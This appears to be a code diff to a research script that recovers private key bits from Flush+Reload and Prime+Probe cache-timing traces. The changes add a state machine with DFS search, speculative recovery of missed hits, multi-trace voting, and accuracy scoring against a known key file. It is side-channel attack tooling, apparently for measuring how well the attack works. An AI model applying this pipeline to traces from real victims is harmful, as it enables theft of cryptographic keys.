@@ -1,7 +1,9 @@
 import argparse
+import contextlib
 import glob
 import os
 from collections import Counter
+from concurrent.futures import ProcessPoolExecutor, as_completed
 import pandas as pd
 import numpy as np
 
@@ -16,6 +18,45 @@ attack_type = "FR"
 acc_threshold = 0.75
 key_path = None
 COMSUME_ZEROS_DUP_INTERVAL = 40000
+
+MAX_RISKY_GUESSES = 1
+NORMAL_RATIO = 0.2
+RECOVERY_RATIO = 0.3
+
+# Per-step trace dump — only useful when debugging a single file.
+DEBUG_PRINT = False
+
+
+def dbg(*args, **kwargs):
+    if DEBUG_PRINT:
+        print(*args, **kwargs)
+
+
+
+def build_transition_table():
+    table = {}
+    table[(("", 0), "CZ")] = (150000, ("CZ", 1))
+    table[(("", 0), "AW")] = (150000, ("AW", 1))
+
+    table[(("CZ", 1), "CZ")] = (150000, ("CZ", 1))
+    table[(("CZ", 1), "AW")] = (150000, ("AW", 1))
+
+    for i in range(1, 5):
+        table[(("AW", i), "AT")] = (300000, ("AT", i + 1))
+        table[(("AW", i), "AW")] = (150000, ("AW", i + 1))
+
+    for i in range(2, 5):
+        table[(("AT", i), "AT")] = (150000, ("AT", i + 1))
+
+    table[(("AW", 5), "AW")] = (300000, ("AW", 1))
+    table[(("AW", 5), "CZ")] = (300000, ("CZ", 1))
+    table[(("AT", 5), "AW")] = (150000, ("AW", 1))
+    table[(("AT", 5), "CZ")] = (150000, ("CZ", 1))
+
+    return table
+
+
+TRANSITION_TABLE = build_transition_table()
 
 
 def run_state_machine(hits):
@@ -136,13 +177,13 @@ def parse_trace_PS(filepath):
         tmp["src"] = mapping[col]
         hits.append(tmp)
 
-    cache_hits = pd.concat(hits, ignore_index=True)
-    cache_hits = cache_hits[~((cache_hits["tsc"] == 0) & (cache_hits["lat"] == 0))]
-    cache_hits = (
-        cache_hits.drop(columns=["lat"]).sort_values("tsc").reset_index(drop=True)
+    visited_hits = pd.concat(hits, ignore_index=True)
+    visited_hits = visited_hits[~((visited_hits["tsc"] == 0) & (visited_hits["lat"] == 0))]
+    visited_hits = (
+        visited_hits.drop(columns=["lat"]).sort_values("tsc").reset_index(drop=True)
     )
 
-    return cache_hits
+    return visited_hits
 
 
 def merge_traces(size, files):
@@ -243,32 +284,9 @@ def parse_PS_window(seg, window_start, window_size):
 
 
 def get_next_state(current_state, trigger, ratio=0.2):
-    print("get_next_state:", current_state, trigger)
-    transition_table = {}
-
-    transition_table[(("", 0), "CZ")] = (150000, ("CZ", 1))
-    transition_table[(("", 0), "AW")] = (150000, ("AW", 1))
-
-    transition_table[(("CZ", 1), "CZ")] = (150000, ("CZ", 1))
-    transition_table[(("CZ", 1), "AW")] = (150000, ("AW", 1))
-
-    for i in range(1, 5):
-        transition_table[(("AW", i), "AT")] = (300000, ("AT", i + 1))
-        transition_table[(("AW", i), "AW")] = (150000, ("AW", i + 1))
-
-    for i in range(2, 5):
-        transition_table[(("AT", i), "AT")] = (150000, ("AT", i + 1))
-
-    transition_table[(("AW", 5), "AW")] = (300000, ("AW", 1))
-    transition_table[(("AW", 5), "CZ")] = (300000, ("CZ", 1))
-    transition_table[(("AT", 5), "AW")] = (150000, ("AW", 1))
-    transition_table[(("AT", 5), "CZ")] = (150000, ("CZ", 1))
-
-    # from pprint import pprint
-    # pprint(transition_table)
-
+    dbg("get_next_state:", current_state, trigger)
     trigger_name, trigger_value = trigger
-    entry = transition_table.get((current_state, trigger_name))
+    entry = TRANSITION_TABLE.get((current_state, trigger_name))
     if entry is None:
         return None, None
 
@@ -279,8 +297,14 @@ def get_next_state(current_state, trigger, ratio=0.2):
     return None, None
 
 
+def get_state_successors(state):
+    for (s, trig), (center, n_state) in TRANSITION_TABLE.items():
+        if s == state:
+            yield trig, center, n_state
+
+
 def resolve_bits(current_state, next_state, diff):
-    print(current_state, next_state, diff)
+    dbg(current_state, next_state, diff)
     bits_table = {
         (("", 0), ("CZ", 1)): "",
         (("", 0), ("AW", 1)): "",
@@ -306,7 +330,243 @@ def resolve_bits(current_state, next_state, diff):
     return bits_table.get((current_state, next_state))
 
 
-def infer_PS(seg, pre_counts=None):
+def dfs_trace(
+    tsc,
+    src,
+    state,
+    pos,
+    last_tsc,
+    count,
+    inf,
+    window_size,
+    visited=None,
+    target_length=None,
+    risky_guesses=0,
+):
+    # Returns (inf, had_confident). The visited key includes risky_guesses
+    # because results that touched recovery depend on whether the caller had
+    # already used a guess.
+    if visited is None:
+        visited = {}
+
+    if target_length is not None and len(inf) >= target_length:
+        return inf, False
+
+    if pos >= len(tsc):
+        return inf, False
+
+    visited_key = (state, pos, last_tsc, risky_guesses)
+    if visited_key in visited:
+        return inf + visited[visited_key][0], visited[visited_key][1]
+
+    initial_len = len(inf)
+    had_confident = False
+
+    while pos < len(tsc):
+        dbg("New Group starting from:")
+        dbg(tsc[pos], src[pos], "Index", count[src[pos]])
+
+        n_pos = pos
+        while n_pos < len(tsc) and tsc[n_pos] - tsc[pos] < window_size:
+            n_pos += 1
+
+        def collect(ratio):
+            out = []
+            for idx in range(pos, n_pos):
+                n_state, diff = get_next_state(
+                    state, (src[idx], tsc[idx] - last_tsc), ratio=ratio
+                )
+                if n_state:
+                    out.append((n_state, idx, diff))
+            return out
+
+        ns_list = collect(NORMAL_RATIO)
+
+        if ns_list:
+            # Branch over every viable candidate observation — including two
+            # that share the same next_state but straddle the expected delta
+            # (e.g. one Δ just under, one just over center). Picking only the
+            # smallest-diff one drops information when the diffs are similar.
+            candidates = sorted(ns_list, key=lambda x: x[2])
+
+            if len(candidates) == 1:
+                n_state, nw_idx, diff = candidates[0]
+                bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
+                if bits is None:
+                    dbg("???")
+                    visited[visited_key] = (inf[initial_len:], had_confident)
+                    return inf, had_confident
+
+                for i in range(pos, nw_idx + 1):
+                    count[src[i]] += 1
+                inf += bits
+                state = n_state
+                last_tsc = tsc[nw_idx]
+                pos = nw_idx + 1
+                had_confident = True
+                risky_guesses = 0
+                dbg("Infer Length " + str(len(inf)), inf, "\n", sep="\n")
+
+                if target_length is not None and len(inf) >= target_length:
+                    dbg(f"[DONE] reached target_length={target_length}; aborting search.")
+                    return inf, had_confident
+                continue
+
+            # Multi-candidate confident DFS: pick the branch that runs longer.
+            dbg(
+                f"[BRANCH] {len(candidates)} candidate next states from {state}: "
+                f"{[c[0] for c in candidates]}"
+            )
+            best_branch = inf
+            best_branch_had_conf = had_confident
+            early_term = False
+            for n_state, nw_idx, diff in candidates:
+                bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
+                if bits is None:
+                    continue
+                sub_count = dict(count)
+                for i in range(pos, nw_idx + 1):
+                    sub_count[src[i]] += 1
+                sub_inf = inf + bits
+                dbg(
+                    f"  [confident] {state} -> {n_state} "
+                    f"(bits={bits!r}, diff={diff})"
+                )
+                branch, branch_had_conf = dfs_trace(
+                    tsc,
+                    src,
+                    n_state,
+                    nw_idx + 1,
+                    tsc[nw_idx],
+                    sub_count,
+                    sub_inf,
+                    window_size,
+                    visited,
+                    target_length,
+                    0,
+                )
+                if target_length is not None and len(branch) >= target_length:
+                    best_branch = branch
+                    best_branch_had_conf = had_confident or branch_had_conf
+                    early_term = True
+                    break
+                if len(branch) > len(best_branch):
+                    best_branch = branch
+                    best_branch_had_conf = had_confident or branch_had_conf
+            if not early_term:
+                visited[visited_key] = (best_branch[initial_len:], best_branch_had_conf)
+            return best_branch, best_branch_had_conf
+
+        # No matching transition at the normal ratio.
+        if risky_guesses >= MAX_RISKY_GUESSES:
+            dbg(
+                f"Stuck at pos {pos} state {state}; chained {risky_guesses} "
+                "guesses with no confident match — refusing further speculation."
+            )
+            visited[visited_key] = (inf[initial_len:], had_confident)
+            return inf, had_confident
+
+        # Build recovery branches: loose-ratio matches AND virtual successors.
+        # Each branch must be validated by a downstream confident match.
+        recovery_branches = []
+
+        for n_state, nw_idx, diff in sorted(collect(RECOVERY_RATIO), key=lambda x: x[2]):
+            bits = resolve_bits(state, n_state, tsc[nw_idx] - last_tsc)
+            if bits is None:
+                continue
+            recovery_branches.append(
+                ("loose", n_state, nw_idx + 1, tsc[nw_idx], bits, nw_idx)
+            )
+
+
+        for trig_name, center, n_state in get_state_successors(state):
+            bits = resolve_bits(state, n_state, center)
+            if bits is None:
+                continue
+            recovery_branches.append(
+                ("spec", n_state, pos, last_tsc + center, bits, trig_name)
+            )
+
+        # Delayed match: a real observation arrived later than expected due to
+        # a random scheduling delay (per user's diagnosis of r3/r7). Same
+        # transition as a confident match, just stretched. We advance last_tsc
+        # by `center` (canonical position) so subsequent timing measures from
+        # where the obs SHOULD have been — this assumes the trace catches back
+        # up after the one-off delay. (Advancing to the actual obs tsc instead
+        # explodes the visited key space and OOMs the DFS.)
+        for idx in range(pos, n_pos):
+            actual_delta = tsc[idx] - last_tsc
+            trig = src[idx]
+            entry = TRANSITION_TABLE.get((state, trig))
+            if entry is None:
+                continue
+            center, n_state = entry
+            if actual_delta <= center * (1 + RECOVERY_RATIO):
+                continue
+            bits = resolve_bits(state, n_state, center)
+            if bits is None:
+                continue
+            recovery_branches.append(
+                ("delayed", n_state, idx + 1, last_tsc + center,
+                 bits, f"delayΔ={actual_delta - center}@{idx}")
+            )
+
+        dbg(
+            f"[RECOVER] no transition from {state} at pos {pos}; "
+            f"trying {len(recovery_branches)} recovery branches"
+        )
+        threshold = len(inf)
+        best_branch = inf
+        best_branch_had_conf = had_confident
+        early_term = False
+        for kind, n_state, next_pos, new_last_tsc, bits, tag in recovery_branches:
+            new_count = dict(count)
+            if kind == "loose" or kind == "delayed":
+                for i in range(pos, next_pos):
+                    new_count[src[i]] += 1
+            branch_inf = inf + bits
+            dbg(
+                f"  [{kind}] {state} -> {n_state} tag={tag} "
+                f"(bits={bits!r}, last_tsc={new_last_tsc}, next_pos={next_pos})"
+            )
+            branch, branch_had_conf = dfs_trace(
+                tsc,
+                src,
+                n_state,
+                next_pos,
+                new_last_tsc,
+                new_count,
+                branch_inf,
+                window_size,
+                visited,
+                target_length,
+                risky_guesses + 1,
+            )
+            if target_length is not None and len(branch) >= target_length:
+                best_branch = branch
+                best_branch_had_conf = had_confident or branch_had_conf
+                early_term = True
+                break
+            # Only keep a guess that produced an actual confident match in its
+            # subtree. Pure speculation chains (no real observation matched)
+            # get discarded — their bits aren't trustworthy.
+            if branch_had_conf and len(branch) > len(best_branch):
+                best_branch = branch
+                best_branch_had_conf = True
+        if len(best_branch) == threshold:
+            dbg(
+                "[RECOVER] no branch validated; "
+                "discarding all recovery guesses at this point."
+            )
+        if not early_term:
+            visited[visited_key] = (best_branch[initial_len:], best_branch_had_conf)
+        return best_branch, best_branch_had_conf
+
+    visited[visited_key] = (inf[initial_len:], had_confident)
+    return inf, had_confident
+
+
+def infer_PS(seg, pre_counts=None, target_length=None):
     inf = ""
 
     tsc = seg["tsc"].values
@@ -329,6 +589,7 @@ def infer_PS(seg, pre_counts=None):
     print(seg)
     start_end = start_idx
     while tsc[start_end] - tsc[start_idx] < start_window:
+        print(start_end, start_idx, tsc[start_end] - tsc[start_idx])
         start_end += 1
 
     pos = start_end
@@ -366,7 +627,7 @@ def infer_PS(seg, pre_counts=None):
 
     print("First window: ", inf)
 
-    # Remaining Windows
+    # Remaining Windows (recursive DFS, with bounded speculation on missed hits)
 
     state = ("", 0)
     # FIXME: hardcoded window size
@@ -376,56 +637,13 @@ def infer_PS(seg, pre_counts=None):
     for i in range(pos):
         count[src[i]] += 1
 
-    # pos: the index of cache hit to check
-    # lw_idx: last chosen hit index
-    # nw_idx: next chosen hit index
-
-    while pos < len(seg):
-        print("New Group starting from:")
-        print(tsc[pos], src[pos], "Index", count[src[pos]])
-
-        lw_idx = pos - 1
-        n_pos = pos
-        while n_pos < len(tsc) and tsc[n_pos] - tsc[pos] < window_size:
-            n_pos += 1
-
-        ns_list = []  # [(next_state, nw_idx, diff), ...]
-        for idx in range(pos, n_pos):
-            n_state, diff = get_next_state(state, (src[idx], tsc[idx] - tsc[lw_idx]))
-            if n_state:
-                ns_list.append((n_state, idx, diff))
-
-        # NOTE(heuristics): CZ AW Speculation
-        ns_states = {s for s, _, _ in ns_list}
-
-        if ns_states == {("CZ", 1), ("AW", 1)}:
-            ns_list = [(s, i, d) for s, i, d in ns_list if s == ("AW", 1)]
-        elif ns_states == {("AW", 3), ("AT", 3)}:
-            ns_list = [(s, i, d) for s, i, d in ns_list if s == ("AW", 3)]
-
-        ns_states = {s for s, _, _ in ns_list}
-        if len(ns_states) > 0:
-            n_state, nw_idx, diff = min(ns_list, key=lambda x: x[2])
-
-            bits = resolve_bits(state, n_state, tsc[nw_idx] - tsc[lw_idx])
-            state = n_state
-            for i in range(pos, nw_idx + 1):
-                count[src[i]] += 1
-            pos = nw_idx + 1
-            if bits == None:
-                print("???")
-            inf += bits
-            if not check_inf_match(inf):
-                print("Mismatch")
-            print("Infer Length " + str(len(inf)), inf, "\n", sep="\n")
-        elif len(ns_states) == 0:
-            print("Ignore Mismatch Pattern")
-            # count[src[pos]] += 1
-            pos += 1
-            break
-        else:
-            print("?", ns_states)
-            return
+    last_tsc = tsc[pos - 1] if pos > 0 else 0
+    visited = {}
+    inf, _ = dfs_trace(
+        tsc, src, state, pos, last_tsc, count, inf, window_size,
+        visited=visited, target_length=target_length,
+    )
+    print(f"[dfs visited] entries={len(visited)} target_length={target_length}")
 
     return inf
 
@@ -447,84 +665,123 @@ def find_str_offset(d, inf):
     return offset - i
 
 
-def collect_metrics(d, inf, size):
-    recoverable = 0
-    recoverable_leading = 0
-    masked = []
+INF_CHAR_TO_INT = {"0": 0, "1": 1, "?": -1}
+
+
+def collect_metrics(d, inf, size=1):
+    """Single source of truth for inference scoring.
+
+    Args:
+        d:   ground-truth key bits as a list of int (0/1).
+        inf: inference, either a string of '0'/'1'/'?' or a list of int
+             (0/1/-1, where -1 is '?'). Both forms are normalized internally.
+        size: number of source traces folded into `inf` (1 for a single trace,
+              N for a merged vote across N).
+
+    Conventions:
+        - A position is "recoverable" if the trace structure pins its value
+          down: leading 0s, window-edge 1s, and trailing 0s inside a window.
+        - Inner-window `?` positions are NOT recoverable.
+        - Recovered  = recoverable positions where the inference committed a bit.
+        - Accuracy   = of all non-? inferences, how many match gt at a
+                       recoverable position. Committing a bit at an inner-`?`
+                       position is inaccurate even if the value happens to
+                       match gt — the trace had no business pinning it down.
+    """
+    # Normalize inf to int form.
+    if isinstance(inf, str):
+        inf_int = [INF_CHAR_TO_INT.get(c, -1) for c in inf]
+    else:
+        inf_int = list(inf)
+
+    # Build `recoverable_bits` parallel to d: 0 or 1 where the structure pins
+    # the value down, -1 inside windows where the trace can't.
+    recoverable_bits = []
     i = 0
     l = len(d)
-    offset = 0
-    recovered = 0
-    correct = 0
-    first_failure = 0
-    end_window = 0
     while i < l:
         if d[i] == 0:
-            recoverable_leading += 1
+            recoverable_bits.append(0)
             i += 1
-            masked.append(0)
             continue
 
-        t = 0
         end = min(l - 1, i + 4)
+        at = 0
         while end > i:
             if d[end] == 1:
                 break
-            recoverable += 1
             end -= 1
-            t += 1
+            at += 1
 
-        s = end - i + 1
-        recoverable += min(s, 2)
-        i += s + t
+        aw = end - i + 1
+        if aw < 3:
+            recoverable_bits += [1] * aw
+        else:
+            recoverable_bits += [1] + [-1] * (aw - 2) + [1]
+        recoverable_bits += [0] * at
+        i += aw + at
 
-        masked.append(1)
-        for j in range(s - 2):
-            masked.append(-1)
-        if s > 1:
-            masked.append(1)
-        for j in range(t):
-            masked.append(0)
+    recoverable = sum(1 for b in recoverable_bits if b != -1)
 
-        if i == l:
-            end_window = s + t
+    recovered = 0
+    inferred = 0
+    correct = 0
+    q = 0
+    first_failure = -1
 
-    for o in range(15):
-        correct = 0
-        first_failure = 0
-        recovered = 0
-        for i, (x, y) in enumerate(zip(d[o:], inf)):
-            if y != -1:
-                recovered += 1
-                if x == y:
-                    correct += 1
-                elif first_failure == 0 and y >= 0:
-                    first_failure = i
-        offset = o
-        if correct / (recoverable + recoverable_leading) > acc_threshold:
-            break
+    for idx in range(min(l, len(inf_int))):
+        bit = recoverable_bits[idx]
+        inf_bit = inf_int[idx]
 
+        if inf_bit == -1:
+            q += 1
+            continue
+        if bit != -1:
+            recovered += 1
+
+        inferred += 1
+        if bit != -1 and inf_bit == bit:
+            correct += 1
+        elif first_failure == -1:
+            first_failure = idx
+
+    inf_len = len(inf)
     return {
         "Sample Size": size,
-        "Bits": len(inf),
-        "Offset": offset,
+        "Bits": inf_len,
+        "Recoverable": recoverable,
         "Recovered": recovered,
+        "Recovered%": (recovered / recoverable * 100.0) if recoverable else 0.0,
+        "Inferred": inferred,
         "Correct": correct,
-        "Accuracy": correct / l,
-        "Relative Accuracy (incl. leading and trailing)": correct
-        / (recoverable + recoverable_leading),
-        "Inference Accuracy (excl leading and trailing)": correct
-        / (recoverable + recoverable_leading - end_window - o),
+        "Wrong": inferred - correct,
+        "?": q,
+        "?%": (q / inf_len * 100.0) if inf_len else 0.0,
+        "Accuracy%": (correct / inferred * 100.0) if inferred else 0.0,
         "First Failure": first_failure,
     }
 
 
-def merge_inferences(inf_list, target_len):
+def merge_inferences(inf_list, target_len, min_vote_ratio=0.5):
+    # A position commits to 0 or 1 only when:
+    #   - one side strictly outvotes the other (plurality), AND
+    #   - the winning side's vote count is at least min_vote_ratio of the
+    #     traces that actually reached this position (i.e. didn't already
+    #     give up before pos i).
+    # Otherwise the position stays '?'. This stops a single noisy trace from
+    # flipping a position that the majority of traces correctly left as '?'.
     result = []
     for i in range(target_len):
-        v0 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == 0)
-        v1 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == 1)
-        if v1 > v0:
+        reached = sum(1 for inf in inf_list if i < len(inf))
+        if reached == 0:
+            result.append(-1)
+            continue
+        v0 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == "0")
+        v1 = sum(1 for inf in inf_list if i < len(inf) and inf[i] == "1")
+        winner_votes = max(v0, v1)
+        if winner_votes / reached < min_vote_ratio:
+            result.append(-1)
+        elif v1 > v0:
             result.append(1)
         elif v0 > v1:
             result.append(0)
@@ -576,8 +833,8 @@ def extract_FR(folder):
     return metrics
 
 
-def parse_trace_segment(cache_hits, k=4):
-    tsc = cache_hits["tsc"].values
+def parse_trace_segment(visited_hits, k=4):
+    tsc = visited_hits["tsc"].values
     diff = np.diff(tsc)
 
     d50 = np.percentile(diff, 50)
@@ -591,18 +848,48 @@ def parse_trace_segment(cache_hits, k=4):
     target_range = max(segments, key=len)
     low, high = target_range[0], target_range[-1]
     print(low, high)
-    core_seg = cache_hits[
-        (cache_hits["tsc"] >= low) & (cache_hits["tsc"] <= high)
+    core_seg = visited_hits[
+        (visited_hits["tsc"] >= low) & (visited_hits["tsc"] <= high)
     ].reset_index(drop=True)
-    pre = cache_hits[cache_hits["tsc"] < low]["src"].value_counts().to_dict()
+    pre = visited_hits[visited_hits["tsc"] < low]["src"].value_counts().to_dict()
     pre_counts = {k: pre.get(k, 0) for k in ("CZ", "AW", "AT")}
     return core_seg, pre_counts
 
 
-def process_PS_file(filepath):
+def process_PS_file(filepath, target_length=None):
     hits = parse_trace_PS(filepath)
     core_segment, pre_counts = parse_trace_segment(hits)
-    return infer_PS(core_segment, pre_counts)
+    return infer_PS(core_segment, pre_counts, target_length=target_length)
+
+
+def process_PS_file_silent(filepath, target_length=None):
+    """Worker target for ProcessPoolExecutor: runs process_PS_file with
+    stdout/stderr redirected to /dev/null so debug prints don't drown the
+    parent's metrics output. Returns (filepath, inf_or_empty, error_or_None)."""
+    try:
+        with open(os.devnull, "w") as devnull:
+            with contextlib.redirect_stdout(devnull), contextlib.redirect_stderr(devnull):
+                inf = process_PS_file(filepath, target_length=target_length) or ""
+        return filepath, inf, None
+    except Exception as exc:
+        return filepath, "", f"{type(exc).__name__}: {exc}"
+
+
+def print_metrics_header():
+    print(
+        f"# {'file':<10} {'inf_len':>8} {'?':>6} {'?%':>6} {'inferred':>9} "
+        f"{'correct':>8} {'acc%':>7} {'wrong':>6} {'first_wrong':>11} {'status':>10}",
+        flush=True,
+    )
+
+
+def print_metrics_row(label, m, status):
+    print(
+        f"  {label:<10} {m['Bits']:>8} {m['?']:>6} {m['?%']:>5.1f}% "
+        f"{m['Inferred']:>9} {m['Correct']:>8} {m['Accuracy%']:>6.2f}% "
+        f"{m['Wrong']:>6} {m['First Failure']:>11} {status:>10}",
+        flush=True,
+    )
 
 
 def extract_PS(folder):
@@ -611,28 +898,72 @@ def extract_PS(folder):
         d = list(map(int, keys[2:]))
         global gt
         gt = list(keys[2:])
-        print(keys)
+    gt_str = "".join(gt)
 
-    files = glob.glob(f"{folder}/*.out")
+    # Sort by trace index (r0.out, r1.out, ..., r15.out) like run_batch.sh.
+    def trace_index(p):
+        name = os.path.basename(p)
+        stem = name[1:].split(".")[0] if name.startswith("r") else name
+        try:
+            return (0, int(stem))
+        except ValueError:
+            return (1, name)
 
-    all_infs = []
+    files = sorted(glob.glob(f"{folder}/r*.out"), key=trace_index)
+
+    print(f"# folder={folder} gt_len={len(gt_str)}")
+    print_metrics_header()
+
+    totals = {"inferred": 0, "correct": 0, "q": 0, "wrong": 0, "len": 0}
+    ok_runs = 0
     metrics = []
+    all_infs = []
 
     task = progress.add_task("[green]Processing traces (PS)...", total=len(files))
-    next_metric_at = 1
 
-    for file_idx, filepath in enumerate(files, 1):
-        inf = process_PS_file(filepath)
+    # Run each trace in its own subprocess; child stdout/stderr is silenced so
+    # only the per-trace metrics row reaches this stdout. We print each row
+    # as soon as the future completes — order is by completion time, not by
+    # trace index, so accuracy is visible live as workers finish.
+    with ProcessPoolExecutor() as executor:
+        futures = {
+            executor.submit(process_PS_file_silent, fp, len(gt_str)): fp
+            for fp in files
+        }
+        for fut in as_completed(futures):
+            fp, inf, err = fut.result()
+            name = os.path.basename(fp)
+            if err:
+                status = f"ERR:{err.split(':', 1)[0]}"
+            else:
+                status = "ok" if inf else "no-inf"
 
-        if inf:
-            all_infs.append(inf)
-        progress.update(task, advance=1)
+            m = collect_metrics(d, inf, 1)
+            print_metrics_row(name, m, status)
+            totals["inferred"] += m["Inferred"]
+            totals["correct"] += m["Correct"]
+            totals["q"] += m["?"]
+            totals["wrong"] += m["Wrong"]
+            totals["len"] += m["Bits"]
+            if status == "ok" and m["Accuracy%"] >= 99.0 and m["?%"] <= 40.0:
+                ok_runs += 1
+            if inf:
+                all_infs.append(inf)
+            progress.update(task, advance=1)
 
-        if file_idx == next_metric_at and all_infs:
-            merged_inf = merge_inferences(all_infs, len(d))
-            m = collect_metrics(d, merged_inf, file_idx)
-            metrics.append(m)
-            next_metric_at *= 2
+    agg_acc = 100 * totals["correct"] / max(1, totals["inferred"])
+    print(
+        f"# totals: inferred={totals['inferred']} correct={totals['correct']} "
+        f"({agg_acc:.2f}%) q={totals['q']} wrong={totals['wrong']}  "
+        f"good_runs={ok_runs}/{len(files)}"
+    )
+
+    # Merge all per-file inferences into a single voted key.
+    if all_infs:
+        merged_int = merge_inferences(all_infs, len(d))
+        m_final = collect_metrics(d, merged_int, len(all_infs))
+        print_metrics_row("MERGED", m_final, "merged")
+        metrics.append(m_final)
 
     progress.remove_task(task)
     return metrics
@@ -674,23 +1005,37 @@ if __name__ == "__main__":
         help="Accuracy threshold for offset alignment (default: 0.75)",
     )
 
+    parser.add_argument(
+        "--debug",
+        action="store_true",
+        help="Enable per-step DFS debug prints (very verbose).",
+    )
+
     args = parser.parse_args()
 
     attack_type = args.at
     acc_threshold = args.threshold
     key_path = args.key
+    DEBUG_PRINT = args.debug
 
     if os.path.isfile(args.path):
         folder = os.path.dirname(os.path.abspath(args.path))
         kfile = key_path or os.path.join(folder, "private.key")
+        target_length = None
         if os.path.exists(kfile):
             with open(kfile) as f:
                 keys = f.read().strip()
             gt = list(keys[2:])
+            target_length = len(gt)
         if attack_type == "PS":
             with progress:
-                inf = process_PS_file(args.path)
+                inf = process_PS_file(args.path, target_length=target_length)
             print(inf)
+            if inf and os.path.exists(kfile):
+                d = list(map(int, gt))
+                m = collect_metrics(d, inf, 1)
+                print_metrics_header()
+                print_metrics_row(os.path.basename(args.path), m, "ok")
     else:
         if attack_type == "FR":
             with progress:
@@ -699,6 +1044,4 @@ if __name__ == "__main__":
                 print(m)
         elif attack_type == "PS":
             with progress:
-                metrics = extract_PS(args.path)
-            for m in metrics:
-                print(m)
+                extract_PS(args.path)
